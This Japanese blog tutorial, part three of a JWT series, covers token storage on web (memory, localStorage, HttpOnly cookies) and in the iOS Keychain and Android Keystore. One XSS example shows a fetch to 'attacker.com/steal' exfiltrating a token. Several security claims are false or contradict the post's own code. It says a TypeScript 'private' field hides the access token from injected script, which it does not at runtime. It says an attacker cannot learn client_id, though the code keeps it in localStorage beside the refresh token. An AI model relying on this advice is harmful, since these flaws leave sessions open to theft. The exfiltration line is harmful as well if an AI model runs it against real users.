---
title: "JWT認証システム実装ガイド 第三回 - 本質を理解して堅牢な認証を構築する"
summary: "JWTは認証フレームワークではなく署名付きトークン。実装経験から学んだ本質的な理解と、Web/モバイル両対応の実践的な設計パターンを解説します。"
tags:
  ["JWT", "認証", "セキュリティ", "Web開発", "モバイル開発", "Redis", "API設計"]
---

## 4. トークンの保存場所とセキュリティ

### 4.1 Web アプリケーション

Web開発において、トークンの保存場所は**セキュリティと利便性のトレードオフ**が最も顕著に現れる部分です。

#### 4.1.1 アクセストークンの保存

**結論：メモリ（変数）に保存する**

```typescript
// ✅ 推奨：メモリ管理
class TokenManager {
  private accessToken: string | null = null;

  setAccessToken(token: string) {
    this.accessToken = token;
  }

  getAccessToken(): string | null {
    return this.accessToken;
  }

  clearAccessToken() {
    this.accessToken = null;
  }
}

const tokenManager = new TokenManager();
```

**なぜメモリなのか？**

| 保存場所             | セキュリティ | メリット                                   | デメリット                                      |
| -------------------- | ------------ | ------------------------------------------ | ----------------------------------------------- |
| **メモリ（変数）**   | ⭐⭐⭐⭐⭐   | XSS攻撃で盗めない<br/>リロード時に自動削除 | リロードで消える<br/>タブ間で共有できない       |
| localStorage         | ⭐           | 永続化可能<br/>実装が簡単                  | XSSで簡単に盗める<br/>`document.cookie`で読める |
| Cookie（非HttpOnly） | ⭐⭐         | 自動送信<br/>期限管理が簡単                | XSSで盗める<br/>CSRF攻撃のリスク                |
| Cookie（HttpOnly）   | ⭐⭐⭐⭐     | JSから読めない<br/>XSS耐性高い             | モバイル非対応（後述）                          |

**XSS攻撃のシナリオ：**

```javascript
// ❌ localStorageに保存した場合
localStorage.setItem("access_token", "eyJhbGci...");

// 攻撃者がXSSで注入したスクリプト
const stolenToken = localStorage.getItem("access_token");
fetch("https://attacker.com/steal", {
  method: "POST",
  body: JSON.stringify({ token: stolenToken }),
});
// → トークンが盗まれる！
```

```typescript
// ✅ メモリに保存した場合
class TokenManager {
  private accessToken: string | null = null; // クロージャ内に隠蔽
}

// 攻撃者がXSSで注入したスクリプト
const stolenToken = tokenManager.accessToken; // undefined
// → private なのでアクセス不可
// → window オブジェクトにも存在しない
// → 盗めない！
```

**リロード問題の解決：**

```typescript
// アプリ起動時の処理
async function initApp() {
  const refreshToken = localStorage.getItem("refresh_token");
  const clientId = localStorage.getItem("client_id");

  if (refreshToken && clientId) {
    // リフレッシュトークンで新しいアクセストークンを取得
    const success = await refreshTokens(refreshToken, clientId);

    if (success) {
      // 認証済み状態で起動
      navigateToHome();
    } else {
      // リフレッシュ失敗 → ログイン画面
      navigateToLogin();
    }
  } else {
    // トークンなし → ログイン画面
    navigateToLogin();
  }
}
```

---

#### 4.1.2 リフレッシュトークン + client_idの保存

**結論：localStorage または IndexedDB に保存する**

```typescript
// ✅ 推奨：localStorage
class RefreshTokenManager {
  setTokens(refreshToken: string, clientId: string) {
    localStorage.setItem("refresh_token", refreshToken);
    localStorage.setItem("client_id", clientId);
  }

  getTokens(): { refreshToken: string | null; clientId: string | null } {
    return {
      refreshToken: localStorage.getItem("refresh_token"),
      clientId: localStorage.getItem("client_id"),
    };
  }

  clearTokens() {
    localStorage.removeItem("refresh_token");
    localStorage.removeItem("client_id");
  }
}
```

**なぜlocalStorageでも許容できるのか？**

1. **リフレッシュトークン単体では無意味**

   ```
   攻撃者がXSSでリフレッシュトークンを盗んだ
   → でもclient_idが分からない
   → トークン更新できない
   → セキュリティ層が2重になっている
   ```

2. **有効期限が長い（30日）**

   ```
   アクセストークン: 15分（超短命）
   → 絶対にlocalStorageに置けない

   リフレッシュトークン: 30日（長命）
   → XSSで盗まれても即座の被害は限定的
   → サーバー側で無効化可能
   ```

3. **XSS対策は別途実装**

   ```
   Content Security Policy (CSP)
   入力値のサニタイゼーション
   信頼できるライブラリの使用
   ```

**IndexedDB を使う場合：**

```typescript
// より高度な保存（大量データや構造化データ向け）
class SecureStorage {
  private dbName = "AuthDB";
  private storeName = "tokens";

  async setTokens(refreshToken: string, clientId: string) {
    const db = await this.openDB();
    const tx = db.transaction(this.storeName, "readwrite");
    const store = tx.objectStore(this.storeName);

    await store.put({ key: "refresh_token", value: refreshToken });
    await store.put({ key: "client_id", value: clientId });
    await tx.complete;
  }

  async getTokens() {
    const db = await this.openDB();
    const tx = db.transaction(this.storeName, "readonly");
    const store = tx.objectStore(this.storeName);

    const refreshToken = await store.get("refresh_token");
    const clientId = await store.get("client_id");

    return {
      refreshToken: refreshToken?.value || null,
      clientId: clientId?.value || null,
    };
  }
}
```

**使い分け：**

```
localStorage:
✅ シンプルな実装
✅ 小さいデータ（トークン程度）
✅ ほとんどのケースで十分

IndexedDB:
✅ 大量のオフラインデータ
✅ 構造化されたデータ
✅ より高度な暗号化が必要な場合
```

---

### 4.2 HttpOnly Cookie - 理想と現実

#### 4.2.1 HttpOnly Cookieとは

**最もセキュアな保存方法（理論上）**

```http
Set-Cookie: refresh_token=uuid...; HttpOnly; Secure; SameSite=Strict; Max-Age=2592000
```

**HttpOnlyの特徴：**

```
✅ JavaScriptからアクセス不可
  → document.cookie で読めない
  → XSS攻撃で盗めない

✅ 自動送信
  → 毎回手動でヘッダーに付ける必要なし
  → ブラウザが自動で送る

✅ 期限管理が簡単
  → Max-Age で自動削除
```

**実装例（サーバー側）：**

```go
// Go (Fiber) での実装
func SetTokenCookies(c *fiber.Ctx, accessToken, refreshToken string) {
    // アクセストークン（短命）
    c.Cookie(&fiber.Cookie{
        Name:     "access_token",
        Value:    accessToken,
        HTTPOnly: true,
        Secure:   true,        // HTTPS必須
        SameSite: "Strict",    // CSRF対策
        MaxAge:   900,         // 15分
        Path:     "/",
    })

    // リフレッシュトークン（長命）
    c.Cookie(&fiber.Cookie{
        Name:     "refresh_token",
        Value:    refreshToken,
        HTTPOnly: true,
        Secure:   true,
        SameSite: "Strict",
        MaxAge:   2592000,     // 30日
        Path:     "/auth",     // リフレッシュエンドポイントのみ
    })
}
```

**クライアント側：**

```typescript
// トークンを意識する必要なし
fetch("/api/user/profile", {
  credentials: "include", // Cookieを自動送信
});
// → ブラウザが自動でCookieを付与

// リフレッシュも自動
fetch("/auth/refresh", {
  method: "POST",
  credentials: "include",
});
// → refresh_token が自動で送られる
```

**一見完璧に見えるが...**

---

#### 4.2.2 HttpOnly Cookieの致命的な問題

**問題1：モバイルネイティブアプリで使えない**

```
Web（ブラウザ）:
✅ Cookie自動管理
✅ HttpOnly対応
✅ Same-Site対策

モバイル（ネイティブアプリ）:
❌ Cookieの概念がない
❌ fetch/XMLHttpRequest が使えない（独自HTTP実装）
❌ WebViewでしか認証できない
```

**モバイルでの制約：**

```swift
// iOS - URLSession
let url = URL(string: "https://api.example.com/user/profile")!
var request = URLRequest(url: url)
request.httpMethod = "GET"

// ❌ Cookieは自動送信されない（設定が複雑）
// ❌ HttpOnly Cookieの扱いが難しい

URLSession.shared.dataTask(with: request) { data, response, error in
    // ...
}
```

```kotlin
// Android - OkHttp
val client = OkHttpClient()
val request = Request.Builder()
    .url("https://api.example.com/user/profile")
    .build()

// ❌ Cookieは自動送信されない
// ❌ CookieManagerの設定が必要

client.newCall(request).execute()
```

**WebViewを使う場合の問題：**

```
WebViewでログイン
→ Cookie保存
→ ネイティブ画面に戻る
→ ネイティブHTTPクライアントでAPI呼び出し
→ ❌ Cookieが使えない（別コンテキスト）

結果：
→ 全ての画面をWebViewで作る必要がある
→ ネイティブアプリの意味がない
→ App Store / Play Storeの審査で不利
```

---

**問題2：CORS（Cross-Origin Resource Sharing）の複雑化**

```
Webアプリ: https://myapp.com
API: https://api.myapp.com

→ 異なるドメイン = クロスオリジン
→ credentials: 'include' 必須
→ サーバー側で厳密な設定が必要
```

**サーバー側の設定：**

```go
// CORSの設定が複雑に
app.Use(cors.New(cors.Config{
    AllowOrigins:     []string{"https://myapp.com"},  // ワイルドカード不可
    AllowCredentials: true,                           // 必須
    AllowHeaders:     []string{"Content-Type"},
    AllowMethods:     []string{"GET", "POST", "PUT", "DELETE"},
}))
```

**問題点：**

```
❌ AllowOrigins に * が使えない
  → ドメインを明示する必要がある
  → 開発環境・本番環境で設定が異なる

❌ プリフライトリクエスト（OPTIONS）が増える
  → パフォーマンス低下

❌ サブドメイン対応が面倒
  → app.example.com
  → admin.example.com
  → それぞれ設定が必要
```

---

**問題3：マルチドメイン対応**

```
複数のフロントエンドがある場合：

https://web.myapp.com     → Webアプリ
https://admin.myapp.com   → 管理画面
https://partner.myapp.com → パートナーサイト

→ 全てに個別のCookie設定が必要
→ ドメインごとに認証が独立
→ シングルサインオン（SSO）が困難
```

---

#### 4.2.3 実装時の判断基準

**フローチャート：**

```
あなたのサービスは？

├─ Webのみ
│  └─ 同一ドメイン？
│     ├─ Yes → HttpOnly Cookie 推奨 ⭐⭐⭐⭐⭐
│     └─ No  → JSON返却 推奨 ⭐⭐⭐⭐
│
├─ Web + モバイル
│  └─ JSON返却 必須 ⭐⭐⭐⭐⭐
│     （HttpOnly Cookieは使えない）
│
└─ マイクロサービス / 複数ドメイン
   └─ JSON返却 推奨 ⭐⭐⭐⭐⭐
      （Cookie管理が複雑すぎる）
```

**実際のプロジェクトでの選択：**

| サービスタイプ                | 推奨方式        | 理由                             |
| ----------------------------- | --------------- | -------------------------------- |
| 企業の社内システム（Web限定） | HttpOnly Cookie | セキュリティ最優先・モバイル不要 |
| SaaS（Web + モバイル）        | JSON返却        | モバイル対応必須                 |
| SNS・コンシューマーアプリ     | JSON返却        | マルチプラットフォーム           |
| 公開API                       | JSON返却        | 柔軟性・統合のしやすさ           |

**今回の実装での選択理由：**

```
✅ JSON返却方式を採用

理由：
1. モバイルアプリ対応が必須
2. client_idによる追加セキュリティ層
3. 実装がシンプル
4. デバッグしやすい
5. マルチプラットフォーム対応

トレードオフ：
❌ XSS対策を別途実装する必要
  → CSP（Content Security Policy）
  → 入力値のサニタイゼーション
  → 信頼できるライブラリの使用
```

---

### 4.3 モバイルアプリケーション

モバイルでは、OSが提供するセキュアストレージを使用します。

#### 4.3.1 iOS - Keychain

**最もセキュアな保存場所**

```swift
import Security

class KeychainHelper {
    static func save(key: String, value: String) -> Bool {
        guard let data = value.data(using: .utf8) else { return false }

        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: key,
            kSecValueData as String: data,
            kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlocked
        ]

        // 既存データを削除
        SecItemDelete(query as CFDictionary)

        // 新規保存
        let status = SecItemAdd(query as CFDictionary, nil)
        return status == errSecSuccess
    }

    static func get(key: String) -> String? {
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: key,
            kSecReturnData as String: true,
            kSecMatchLimit as String: kSecMatchLimitOne
        ]

        var result: AnyObject?
        let status = SecItemCopyMatching(query as CFDictionary, &result)

        guard status == errSecSuccess,
              let data = result as? Data,
              let value = String(data: data, encoding: .utf8) else {
            return nil
        }

        return value
    }

    static func delete(key: String) -> Bool {
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: key
        ]

        let status = SecItemDelete(query as CFDictionary)
        return status == errSecSuccess
    }
}
```

**使用例：**

```swift
// トークン保存
KeychainHelper.save(key: "access_token", value: accessToken)
KeychainHelper.save(key: "refresh_token", value: refreshToken)
KeychainHelper.save(key: "client_id", value: "ios-app-v1")

// トークン取得
if let accessToken = KeychainHelper.get(key: "access_token") {
    // API呼び出し
}

// ログアウト時
KeychainHelper.delete(key: "access_token")
KeychainHelper.delete(key: "refresh_token")
KeychainHelper.delete(key: "client_id")
```

**Keychainの特徴：**

```
✅ OSレベルで暗号化
✅ Secure Enclave使用（A7以降）
✅ アプリ削除後も残る（オプション）
✅ Face ID / Touch IDと連携可能
✅ 他のアプリからアクセス不可
```

**生体認証との統合：**

```swift
import LocalAuthentication

func getTokenWithBiometrics() {
    let context = LAContext()
    var error: NSError?

    if context.canEvaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, error: &error) {
        context.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics,
                              localizedReason: "ログインするには認証が必要です") { success, error in
            if success {
                // 生体認証成功 → トークン取得
                if let token = KeychainHelper.get(key: "refresh_token") {
                    self.refreshAccessToken(token)
                }
            }
        }
    }
}
```

---

#### 4.3.2 Android - Keystore

**ハードウェア支援の暗号化**

```kotlin
import androidx.security.crypto.EncryptedSharedPreferences
import androidx.security.crypto.MasterKey

class SecureStorage(context: Context) {
    private val masterKey = MasterKey.Builder(context)
        .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
        .build()

    private val sharedPreferences = EncryptedSharedPreferences.create(
        context,
        "auth_prefs",
        masterKey,
        EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
        EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
    )

    fun saveTokens(accessToken: String, refreshToken: String, clientId: String) {
        sharedPreferences.edit().apply {
            putString("access_token", accessToken)
            putString("refresh_token", refreshToken)
            putString("client_id", clientId)
            apply()
        }
    }

    fun getAccessToken(): String? {
        return sharedPreferences.getString("access_token", null)
    }

    fun getRefreshToken(): String? {
        return sharedPreferences.getString("refresh_token", null)
    }

    fun getClientId(): String? {
        return sharedPreferences.getString("client_id", null)
    }

    fun clearTokens() {
        sharedPreferences.edit().clear().apply()
    }
}
```

**使用例：**

```kotlin
// 初期化
val secureStorage = SecureStorage(context)

// トークン保存
secureStorage.saveTokens(
    accessToken = "eyJhbGci...",
    refreshToken = "550e8400-...",
    clientId = "android-app-v1"
)

// トークン取得
val accessToken = secureStorage.getAccessToken()

// ログアウト
secureStorage.clearTokens()
```

**Android Keystoreの特徴：**

```
✅ ハードウェアバックアップ（TEE/Secure Element）
✅ AES256暗号化
✅ ルート化デバイスでも安全性が高い
✅ 生体認証との統合
✅ 自動バックアップから除外可能
```

**生体認証との統合：**

```kotlin
import androidx.biometric.BiometricPrompt

fun authenticateWithBiometrics(onSuccess: () -> Unit) {
    val executor = ContextCompat.getMainExecutor(this)
    val biometricPrompt = BiometricPrompt(this, executor,
        object : BiometricPrompt.AuthenticationCallback() {
            override fun onAuthenticationSucceeded(result: BiometricPrompt.AuthenticationResult) {
                super.onAuthenticationSucceeded(result)
                onSuccess()
            }

            override fun onAuthenticationError(errorCode: Int, errString: CharSequence) {
                super.onAuthenticationError(errorCode, errString)
                // エラー処理
            }
        })

    val promptInfo = BiometricPrompt.PromptInfo.Builder()
        .setTitle("ログイン")
        .setSubtitle("指紋または顔で認証してください")
        .setNegativeButtonText("キャンセル")
        .build()

    biometricPrompt.authenticate(promptInfo)
}
```

---

### 4.4 実装例の比較

#### 完全な実装例（Web）

```typescript
// token-manager.ts
class TokenManager {
  // アクセストークン：メモリ
  private accessToken: string | null = null;

  // リフレッシュトークン + client_id：localStorage
  private readonly REFRESH_TOKEN_KEY = "refresh_token";
  private readonly CLIENT_ID_KEY = "client_id";

  // アクセストークン管理
  setAccessToken(token: string) {
    this.accessToken = token;
  }

  getAccessToken(): string | null {
    return this.accessToken;
  }

  // リフレッシュトークン + client_id管理
  setRefreshTokens(refreshToken: string, clientId: string) {
    localStorage.setItem(this.REFRESH_TOKEN_KEY, refreshToken);
    localStorage.setItem(this.CLIENT_ID_KEY, clientId);
  }

  getRefreshTokens(): { refreshToken: string | null; clientId: string | null } {
    return {
      refreshToken: localStorage.getItem(this.REFRESH_TOKEN_KEY),
      clientId: localStorage.getItem(this.CLIENT_ID_KEY),
    };
  }

  // 全削除
  clearAll() {
    this.accessToken = null;
    localStorage.removeItem(this.REFRESH_TOKEN_KEY);
    localStorage.removeItem(this.CLIENT_ID_KEY);
  }

  // 自動リフレッシュ
  async refreshIfNeeded(): Promise<boolean> {
    const { refreshToken, clientId } = this.getRefreshTokens();

    if (!refreshToken || !clientId) {
      return false;
    }

    try {
      const response = await fetch("/auth/refresh", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          refresh_token: refreshToken,
          client_id: clientId,
        }),
      });

      if (response.ok) {
        const data = await response.json();
        this.setAccessToken(data.access_token);
        this.setRefreshTokens(data.refresh_token, clientId);
        return true;
      }

      return false;
    } catch (error) {
      console.error("Token refresh failed:", error);
      return false;
    }
  }
}

export const tokenManager = new TokenManager();
```

```typescript
// api-client.ts
async function apiRequest(url: string, options: RequestInit = {}) {
  const token = tokenManager.getAccessToken();

  const response = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      Authorization: token ? `Bearer ${token}` : "",
      "Content-Type": "application/json",
    },
  });

  // 401エラー → 自動リフレッシュ
  if (response.status === 401) {
    const refreshed = await tokenManager.refreshIfNeeded();

    if (refreshed) {
      // リトライ
      return apiRequest(url, options);
    } else {
      // リフレッシュ失敗 → ログアウト
      tokenManager.clearAll();
      window.location.href = "/login";
      throw new Error("Session expired");
    }
  }

  return response;
}
```

---

## まとめ（第3回）

### 今回学んだこと

1. **Webアプリのトークン保存戦略**

   - アクセストークン：メモリ（XSS対策）
   - リフレッシュトークン + client_id：localStorage
   - client_idが第2のセキュリティ層

2. **HttpOnly Cookieの理想と現実**

   - 理論上は最もセキュア
   - しかしモバイルアプリで使えない
   - CORS・マルチドメインで複雑化
   - JSON返却が実用的な選択

3. **モバイルアプリのセキュアストレージ**

   - iOS：Keychain（OSレベル暗号化）
   - Android：Keystore（ハードウェア支援）
   - 生体認証との統合

4. **実装時の判断基準**
   - Web限定 + 同一ドメイン → HttpOnly Cookie検討
   - Web + モバイル → JSON返却必須
   - マルチプラットフォーム → JSON返却推奨

### 次回予告

次回は [**「ベストプラクティスと落とし穴」**](https://techblog-v2.vercel.app/auth/auth-tutorial-4) です。

- トークン設計の詳細（有効期限・署名）
- Redis活用戦略
- エラーハンドリングの実装
- セキュリティチェックリスト
- よくある実装ミスとその回避方法

実践的なコード例とともに、本番環境で使えるノウハウを解説します。
